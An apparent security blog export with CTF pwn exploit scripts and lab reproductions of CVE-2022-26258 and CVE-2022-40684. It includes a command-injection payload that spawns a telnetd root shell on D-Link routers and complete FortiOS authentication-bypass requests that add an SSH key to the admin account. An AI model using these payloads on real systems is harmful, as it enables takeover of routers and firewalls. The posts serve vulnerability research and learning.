== <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">29572</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        b exit</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>libc_base = <span class="hljs-number">0x40ff0</span><br>ld_base = <span class="hljs-number">0x234ff0</span><br>link_map = <span class="hljs-number">0x264180</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset,text</span>):<br>    s(p64(offset))<br>    s(p8(text))<br>    <span class="hljs-keyword">try</span>:<br>        pw.recvuntil(<span class="hljs-string">&quot;HELLO WORLD\x00&quot;</span>,timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_all</span>(<span class="hljs-params">offset,text</span>):<br>    <span class="hljs-keyword">for</span> i,byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(text):<br>        s(p64(offset+i))<br>        s(p8(byte))<br>        pw.recvuntil(<span class="hljs-string">&quot;HELLO WORLD\x00&quot;</span>,timeout=<span class="hljs-number">1</span>)<br><br>l_addr_offset = elf.got[<span class="hljs-string">&#x27;_Exit&#x27;</span>] - elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write(link_map,l_addr_offset)<br><br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br><br>write_all(stdout,p32(<span class="hljs-number">0xfbad3887</span>))   <span class="hljs-comment">#_flags</span><br>write_all(stdout+<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x0f&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br>lss(<span class="hljs-string">&#x27;link_map&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write_all(ld_base+ld.symbols[<span class="hljs-string">&#x27;_r_debug&#x27;</span>]+<span class="hljs-number">0x3e</span>,<span class="hljs-string">b&#x27;_IO_flush_all\x00&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>) <span class="hljs-comment"># start flush</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0x78</span>) <span class="hljs-comment"># stop flush</span><br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write_all(stdout,p32(<span class="hljs-number">0xfbad1800</span>))   <span class="hljs-comment">#_flags</span><br>write_all(stdout+<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\xff&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>) <span class="hljs-comment"># start flush</span><br>pw.recv(<span class="hljs-number">5</span>)<br>base = u64(pw.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ee7e0</span><br>lss(<span class="hljs-string">&#x27;base&#x27;</span>)<br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0x78</span>) <span class="hljs-comment"># stop flush</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">num,i</span>):<br>    part1 = num &lt;&lt; i<br>    part1 &amp;= (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) - <span class="hljs-number">1</span><br>    part2 = num &gt;&gt; (<span class="hljs-number">64</span>- i)<br>    <span class="hljs-keyword">return</span> part1 + part2<br><br>system,binsh = sb(base)<br><br>system = rol(system,<span class="hljs-number">0x11</span>)<br><br>rax = <span class="hljs-number">0x22ec90</span><br>rdi = rax+<span class="hljs-number">0x20</span><br>rdx = rax+<span class="hljs-number">0x18</span><br>fs_30 = <span class="hljs-number">0x2345a0</span><br>write_all(rdi,p64(binsh))<br>write_all(rdx,p64(system))<br><br>write_all(fs_30,p64(<span class="hljs-number">0</span>))<br><br>write_all(ld_base+ld.symbols[<span class="hljs-string">&#x27;_r_debug&#x27;</span>]+<span class="hljs-number">0x3e</span>,<span class="hljs-string">b&#x27;exit\x00&#x27;</span>)<br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-comment"># write(0,0)</span><br><br><br><br><br>pwpw()<br></code></pre></td></tr></table></figure><p>p _rtld_global</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-26258复现</title>
    <link href="/2024/08/13/D-link(CVE-2022-26258)/"/>
    <url>/2024/08/13/D-link(CVE-2022-26258)/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-26258复现"><a href="#CVE-2022-26258复现" class="headerlink" title="CVE-2022-26258复现"></a><center>CVE-2022-26258复现</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="FirmAE"><a href="#FirmAE" class="headerlink" title="FirmAE"></a>FirmAE</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">FirmAE是由国外安全研究团队开发的一款全自动固件仿真工具，FirmAE工具以<br>Firmadyne工具为基础，提出了仲裁仿真的技术方式，将固件仿真成功率由<br>Firmadyne的<span class="hljs-number">16.28</span>%提高到了<span class="hljs-number">79.36</span>%。经FirmAE团队测试，目前已经成功对来自八<br>家设备供应商的超过<span class="hljs-number">1100</span>款无线路由器和网络摄像机固件进行了模拟。<br></code></pre></td></tr></table></figure><h3 id="FirmAE工具安装"><a href="#FirmAE工具安装" class="headerlink" title="FirmAE工具安装"></a>FirmAE工具安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --recursive https://github.com/pr0v3rbs/FirmAE<br><span class="hljs-built_in">cd</span> FirmAE<br>./download.sh<br>./install.sh<br></code></pre></td></tr></table></figure><h3 id="FirmAE工具使用"><a href="#FirmAE工具使用" class="headerlink" title="FirmAE工具使用"></a>FirmAE工具使用</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stata">执行init.<span class="hljs-keyword">sh</span>脚本<br>./init.<span class="hljs-keyword">sh</span><br><br>分析目标固件<br>sudo ./<span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span> -a &lt;固件类型&gt;&lt;固件bin文件&gt;<br><br>运行目标固件<br>sudo ./<span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span> -r &lt;固件类型&gt;&lt;固件bin文件&gt;<br><br>用户级调试实用程序<br>sudo ./<span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span> -<span class="hljs-keyword">d</span> &lt;固件类型&gt;&lt;固件bin文件&gt;<br><br>内核级引导调试<br>sudo ./<span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span> -b &lt;固件类型&gt;&lt;固件bin文件&gt;<br><br>例子：<br>这里我要复现这个漏洞，所以模拟的是D_link<br>sudo ./<span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span>  -r dlink /home/pw/Desktop/<span class="hljs-keyword">D</span>-link/DIR820LA1_FW105B03.bin<br></code></pre></td></tr></table></figure><h2 id="分析固件"><a href="#分析固件" class="headerlink" title="分析固件"></a>分析固件</h2><p>先解压固件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">binwalk </span>-Me 固件<br></code></pre></td></tr></table></figure><p>去漏洞触发点抓个包看看什么情况</p><img src="/2024/08/13/D-link(CVE-2022-26258)/1.png" class=""><p></p><img src="/2024/08/13/D-link(CVE-2022-26258)/2.png" class=""><p>发现是通过的get_set.cpp，用grep -r “get_set” | grep “匹配到二进制文件” 找一下，匹配到三个二进制文件</p><img src="/2024/08/13/D-link(CVE-2022-26258)/3.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bin/smbd程序是Samba服务器的一部分，它允许路由器用户与Windows客户端共享文件和打印机。Samba服务器是一个开源软件，它实现了SMB/CIFS协议，这是Windows操作系统使用的文件和打印机共享协议。bin/smbd程序是Samba服务器的核心组件之一，它提供了文件和打印机共享的功能。<br>bin/flash程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。<br>sbin/ncc2程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过ncc2程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。<br>lib/libapmib.so是D-Link路由器系统中的一个库文件，它包含了许多重要的API和函数，用于实现路由器的各种功能。用户可以通过调用这些API和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。<br></code></pre></td></tr></table></figure><p>这里我们便看下和网络相关的ncc2二进制文件，通过搜索字符串DEVICE_NAME定位到</p><img src="/2024/08/13/D-link(CVE-2022-26258)/4.png" class=""><p>但是这里需要经过一个hasInjectionString函数的check，由于他是一个函数，先去找一下他的库文件，也是用的grep</p><p>grep -r “hasInjectionString”</p><img src="/2024/08/13/D-link(CVE-2022-26258)/5.png" class=""><p>可以很清晰的看到这里的check并不严格，有很多种绕过办法</p><img src="/2024/08/13/D-link(CVE-2022-26258)/6.png" class=""><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><img src="/2024/08/13/D-link(CVE-2022-26258)/7.png" class=""><p>抓包后修改lanHostCfg_DeviceName_1.1.1.0&#x3D;daina为lanHostCfg_DeviceName_1.1.1.0&#x3D;%0atelnetd -l &#x2F;bin&#x2F;sh -p 7080 -b 0.0.0.0%0a</p><img src="/2024/08/13/D-link(CVE-2022-26258)/8.png" class=""><p>成功拿到shell</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-40684</title>
    <link href="/2024/07/30/CVE-2022-40684/"/>
    <url>/2024/07/30/CVE-2022-40684/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-40684复现"><a href="#CVE-2022-40684复现" class="headerlink" title="CVE-2022-40684复现"></a><center>CVE-2022-40684复现</h1><p>防火墙身份认证绕过漏洞</p><p>影响范围</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiProxy &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">FortiProxy</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​网上找到对应版本的虚拟化环境后直接用vm虚拟机打开即可</p><p>​先设置网络</p><img src="/2024/07/30/CVE-2022-40684/1.png" class=""><p>​其中net模式的设置就跟正常使用虚拟机一样，</p><img src="/2024/07/30/CVE-2022-40684/2.png" class=""><p>​记住自己设置的net设置中的网关</p><img src="/2024/07/30/CVE-2022-40684/3.png" class=""><p></p><img src="/2024/07/30/CVE-2022-40684/4.png" class=""><p>​设置好自己本机的虚拟网卡，之后便开始配置防火墙</p><p>​第一次打开飞塔防火墙初始账号为admin，密码为空，之后就会要求你修改密码重新登录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">配置ip地址：<span class="hljs-built_in"></span><br><span class="hljs-built_in">config system interface</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">set</span> mode static<br><span class="hljs-built_in">set</span><span class="hljs-built_in"> ip </span>192.168.159.99 255.255.255.0<br><span class="hljs-built_in">set</span> allowaccess http https<span class="hljs-built_in"> ping </span>ssh<br>end<br><br>配置网关：<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span>router static<br><span class="hljs-built_in">edit</span> 1<br><span class="hljs-built_in">set</span> device port1<br><span class="hljs-built_in">set</span> gateway 192.168.159.2<br>end<br><br>注：配置完成后记得ping下www.baidu.com看是否连接成功<br></code></pre></td></tr></table></figure><p>​打开浏览器输入192.168.159.99进入登录界面</p><img src="/2024/07/30/CVE-2022-40684/5.png" class=""><p>​之后需要验证，forticloud.com，直接去官网注册一个账号就可获取免费的试用license</p><img src="/2024/07/30/CVE-2022-40684/6.png" class=""><h2 id="poc触发漏洞"><a href="#poc触发漏洞" class="headerlink" title="poc触发漏洞"></a>poc触发漏洞</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">PUT /api/v2/cmdb/system/admin/admin HTTP/1.1<br><span class="hljs-section">Host: 192.168.159.99</span><br><span class="hljs-section">User-Agent: Report Runner</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Accept: */*</span><br><span class="hljs-section">Connection:close</span><br><span class="hljs-section">Forwarded: for=&quot;[127.0.0.1]:8888&quot;;by=&quot;[127.0.0.1]:8888&quot;</span><br><span class="hljs-section">Content-Type:application/json</span><br><span class="hljs-section">Content-Length: 425</span><br><br><span class="hljs-section">&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAmcdBezK1Z3v4LWL0u0Ya7/7qZ2TzMYlCvX15tcyopkX9l0Eeu4iAfGpKET6iHs4TdljkROba0ykrDIQUpKSA4l8UQIcElQyNmtmoZ31mWQjwZtXdPganYoIUztiVG8IEQ657tQH4Rx8052YpKEYS1RUEQMb+cGMaP1lkh1cYJmi0UPJzB9sZcVi+rSaid4wJw5LnPdakFGV9oRhLOsz+9EYSqy5ywA0OImV8dmPiOrm+VaJP/F/gbqbcE48vtoZDCx2NDpVV8eO/8L6GK2nXp+a4HSnpnJYrhDKlwSuaDk/eJrh3YBKbcYDTRw1G1TxBgW02YmL1rsi1Yu/R+FuInQ== rsa 2048-072924\&quot;&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>​其中的ssh公钥是用xshell生成的</p><img src="/2024/07/30/CVE-2022-40684/7.png" class=""><p></p><img src="/2024/07/30/CVE-2022-40684/8.png" class=""><p>​发送此请求包后，显示如下表明成功</p><img src="/2024/07/30/CVE-2022-40684/9.png" class=""><p>​之后用xshell连接发现可以直接连接了</p><img src="/2024/07/30/CVE-2022-40684/10.png" class=""><p></p><img src="/2024/07/30/CVE-2022-40684/11.png" class=""><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​为了定位到函数内容，这里需要在防火墙中输入一些指令来输出操作信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">diagnose <span class="hljs-built_in">debug</span> <span class="hljs-built_in">enable</span><br>diagnose <span class="hljs-built_in">debug</span> application httpsd -1<br>diagnose <span class="hljs-built_in">debug</span> cli 8<br></code></pre></td></tr></table></figure><img src="/2024/07/30/CVE-2022-40684/12.png" class=""><p>​然后根据字符串交叉引用定位函数位置</p><p>​通过查找fweb_debug_final定位到此字符串的输出位置，然后交叉引用找是谁调用的这个函数</p><img src="/2024/07/30/CVE-2022-40684/13.png" class=""><p>​然后就找到了，sub_C4BF20，这个函数中输出了fweb_debug_init，接着顺着v3去找一下v3是调用了哪个函数</p><img src="/2024/07/30/CVE-2022-40684/14.png" class=""><p>​发现v3是函数传递参数过来的，定位过去就是这个红框函数，跟进看看</p><img src="/2024/07/30/CVE-2022-40684/15.png" class=""><p>​由于没有符号表，所以只能3分靠看，7分靠猜，发现一个应该是判断响应码的地方</p><img src="/2024/07/30/CVE-2022-40684/16.png" class=""><p>​接着往上看sub_c53A10中可定位到api_access_check_for_trusted_access字符串所在位置(sub_C5A8C0)，而这里就存在两处判断</p><img src="/2024/07/30/CVE-2022-40684/17.png" class=""><p></p><img src="/2024/07/30/CVE-2022-40684/18.png" class=""><p></p><img src="/2024/07/30/CVE-2022-40684/19.png" class=""><p>​这里就会判断User-Agent是否为Report Runner或Node.js，如果是则绕过身份检查，接着交叉应用看还有哪些检查（但是在后续的poc测试中发现这里还是只能使用Report Runner）</p><img src="/2024/07/30/CVE-2022-40684/20.png" class=""><p>​然后接着往上看会发现另外一个check</p><img src="/2024/07/30/CVE-2022-40684/21.png" class=""><p>​先判断是否为本机访问</p><img src="/2024/07/30/CVE-2022-40684/22.png" class=""><p>​然后通过apr_table_get函数取Forwarded中的值</p><img src="/2024/07/30/CVE-2022-40684/23.png" class=""><p>​通过strstr函数来判断是否存在for&#x3D;字符串，后面还会有一个strstr函数来判断是否存在by&#x3D;字符串，不过我在审计代码的时候，并没有发现跟网上说没有函数什么的，实际的poc删除这个也无所谓，自从，整个流程就完成了</p><h2 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h2><p>​首先判断是否为本机访问，接着会取出Forwarde的值，通过strstr查找”for&#x3D;”位置(这个位置实测只要一个for&#x3D;就可以绕过触发)，接着进入最后一个check，判断User-Agent是否为Report Runner，最后将用户赋值为”Local_Process_Access”，此时就可以完成绕过了</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined">PUT /api/v2/cmdb/system/admin/admin HTTP/1.1<br>Host: 192.168.159.99<br>User-Agent: Report Runner<br>Connection:close<br>Forwarded: for=127.0.0.1<br>Content-Length: 425<br><br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyx6BLn9lrHay40IcWN8NyDHrvUEJY74vOKMFBjzpmulgtHt3/ECE/f+DdQxXqqXEIu1L+GvjQ3FJErXOSUtmfprkNTm45dnuRUbXZCIU9aTPLW1P0z4favZeN3szpTNuqt9McLJ6Xr5GNWfDbWP7KgZuh6icqL42bzb67K7kp+qwTNpGwonpmOH9OuCR9iDZebGEPZyL367ad1kKj09Zx9MDts1nm08kB0ciyxOhXymQWsYDYyWs6u0MCABUaIeSs8sR9xGnJd8oAZf1fqVlz5MPylzplZaETWz70PGALTB1tibAROfDQNKZAmqlvYJIkvc7h9CFTiLy9LDzDGOo1w== rsa 2048-073024\&quot;&quot;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024春秋杯夏季赛pwn</title>
    <link href="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/"/>
    <url>/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="2024春秋杯夏季赛pwn"><a href="#2024春秋杯夏季赛pwn" class="headerlink" title="2024春秋杯夏季赛pwn"></a><center>2024春秋杯夏季赛pwn</h1><p>本次比赛作为出题人虽说没参加，但还是看了看题目</p><h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h2><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/1.png" class=""><p></p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/2.png" class=""><p>​跟ciscn东北赛区的题很像，但是ret2dlresolve本地通远程不通，看了下gadget，发现可以有个gadget可以通过控制ebx来达到修改地址的目的</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = 